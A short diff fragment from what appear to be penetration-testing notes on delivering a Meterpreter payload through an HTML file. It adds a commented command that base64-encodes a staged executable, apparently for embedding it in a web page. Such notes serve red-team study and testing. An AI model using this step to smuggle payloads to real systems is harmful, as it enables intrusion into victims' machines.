@@ -30,3 +30,5 @@ Meterpreter payload through HTML file:
     </script>
   </body>
 <html>
+
+# sudo base64  webstaged.exe | tr -d \\n
